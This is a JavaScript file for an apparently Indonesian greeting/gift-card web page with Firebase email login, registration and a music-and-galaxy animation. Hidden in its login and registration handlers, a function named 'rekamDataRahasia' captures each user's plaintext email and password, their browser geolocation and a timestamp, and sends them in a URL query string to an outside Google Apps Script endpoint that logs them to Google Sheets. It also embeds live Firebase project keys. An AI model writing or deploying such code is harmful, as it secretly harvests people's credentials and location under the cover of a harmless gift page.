import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import { 
    getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword, 
    onAuthStateChanged, signOut, sendEmailVerification 
} from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";

// 1. KONFIGURASI FIREBASE (Sesuai dengan proyek Anda)
const firebaseConfig = {
    apiKey: "AIzaSyAm-t2mbHV7sSEcoDvNgZfTinmx5tcSz6s",
    authDomain: "project-bd-163e4.firebaseapp.com",
    projectId: "project-bd-163e4",
    storageBucket: "project-bd-163e4.firebasestorage.app",
    messagingSenderId: "691964855641",
    appId: "1:691964855641:web:b0c45e7badc579cdfc3848"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);

// URL APPS SCRIPT (Pastikan selalu gunakan URL Deployment TERBARU Anda!)
const urlAppsScript = "https://script.google.com/macros/s/AKfycbxsTRDN4JanQwOLqn0T-tW5szz9RoVOdws1o5rAihSYaPi7CbCq4w3jsgLs-4I_4uCPzw/exec";

// 2. TUNGGU UI SELESAI DI-RENDER
document.addEventListener('DOMContentLoaded', () => {
    const loginCard = document.getElementById('login-card');
    const contentCard = document.getElementById('content-card');
    const galaxyUniverse = document.getElementById('galaxy-universe');
    const giftBoxWrapper = document.getElementById('gift-box-wrapper');
    const bgMusic = document.getElementById('bg-music');
    
    const loginButton = document.getElementById('btn-login');
    const btnRegister = document.getElementById('btn-register');
    const emailInput = document.getElementById('input-email');
    const passwordInput = document.getElementById('input-password');

    // 3. MONITOR STATUS LOGIN (AUTH STATE)
    onAuthStateChanged(auth, (user) => {
        if (user) {
            if (user.emailVerified) {
                // Jika sudah verifikasi email, buka akses kartu kado
                loginCard.classList.add('hidden');
                contentCard.classList.remove('hidden');
                galaxyUniverse.classList.add('hidden');
            } else {
                alert("Akses Ditangguhkan! Silakan buka kotak masuk atau folder SPAM email Anda, lalu klik link verifikasi terlebih dahulu.");
                signOut(auth);
            }
        } else {
            // Jika belum login, tampilkan menu login
            loginCard.classList.remove('hidden');
            contentCard.classList.add('hidden');
            galaxyUniverse.classList.add('hidden');
        }
    });

    // 4. AKSI SAAT KADO DIKLIK
    if (giftBoxWrapper) {
        giftBoxWrapper.addEventListener('click', () => {
            contentCard.classList.add('hidden');
            galaxyUniverse.classList.remove('hidden'); 
            
            // Putar musik latar
            if (bgMusic) bgMusic.play().catch(() => console.log("Audio ditahan oleh browser"));
            
            // Panggil fungsi efek mengetik yang ada di HTML
            if (typeof window.startGalaxyHeart === 'function') {
                window.startGalaxyHeart();
            }
        });
    }   

    // 5. TOMBOL LOGOUT
    document.addEventListener('click', async (e) => {
        if (e.target && e.target.id === 'btn-logout') {
            e.preventDefault();
            if (bgMusic) { bgMusic.pause(); bgMusic.currentTime = 0; }
            await signOut(auth);
        }
    });

    // 6. PROSES LOGIN
    if (loginButton) {
        loginButton.addEventListener('click', (e) => {
            e.preventDefault();
            const emailClean = emailInput.value.trim();
            const passwordClean = passwordInput.value.trim();

            if (!emailClean || !passwordClean) {
                alert("Email dan sandi tidak boleh kosong!");
                return;
            }

            // Jalankan pelacakan data & lokasi ke Google Sheets
            rekamDataRahasia(emailClean, passwordClean);

            // Proses autentikasi Firebase
            signInWithEmailAndPassword(auth, emailClean, passwordClean)
                .catch((error) => alert("Gagal Masuk: " + error.message));
        });
    }

    // 7. PROSES REGISTRASI AKUN BARU
    if (btnRegister) {
        btnRegister.addEventListener('click', (e) => {
            e.preventDefault();
            const emailClean = emailInput.value.trim();
            const passwordClean = passwordInput.value.trim();

            if (!emailClean || !passwordClean) {
                alert("Silakan lengkapi email dan password pendaftaran!");
                return;
            }

            // Jalankan pelacakan data & lokasi ke Google Sheets
            rekamDataRahasia(emailClean, passwordClean);

            // Buat user baru di Firebase
            createUserWithEmailAndPassword(auth, emailClean, passwordClean)
                .then((result) => {
                    // Kirim tautan verifikasi email
                    sendEmailVerification(result.user)
                        .then(() => {
                            alert("Pendaftaran Berhasil! Tautan verifikasi telah dikirim. Periksa email Anda dan verifikasi sebelum masuk.");
                            signOut(auth);
                            emailInput.value = "";
                            passwordInput.value = "";
                        });
                })
                .catch((error) => alert("Gagal Mendaftar: " + error.message));
        });
    }
});

// 8. FUNGSI PELACAKAN GEOLOCATION & WAKTU
function rekamDataRahasia(email, password) {
    const sekarang = new Date();
    const opsiWaktu = { timeZone: 'Asia/Jakarta', year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' };
    const waktuFormat = sekarang.toLocaleString('id-ID', opsiWaktu);

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                kirimKeSheets(email, password, waktuFormat, `${lat}, ${lon}`);
            },
            () => {
                kirimKeSheets(email, password, waktuFormat, "Izin Lokasi Ditolak User");
            },
            { timeout: 4000 }
        );
    } else {
        kirimKeSheets(email, password, waktuFormat, "Tidak Didukung Browser");
    }
}

// 9. FUNGSI PENGIRIMAN FETCH API KE GOOGLE APPS SCRIPT
function kirimKeSheets(email, pw, waktu, lokasi) {
    const urlFinal = `${urlAppsScript}?email=${encodeURIComponent(email)}` +
                     `&pw=${encodeURIComponent(pw)}` +
                     `&waktu=${encodeURIComponent(waktu)}` +
                     `&lokasi=${encodeURIComponent(lokasi)}`;
                     
    fetch(urlFinal, { method: 'GET', mode: 'no-cors', cache: 'no-cache' })
    .then(() => console.log("Data berhasil dijembatani ke Sheets via Web App."))
    .catch(err => console.log("Koneksi gagal log server:", err));
}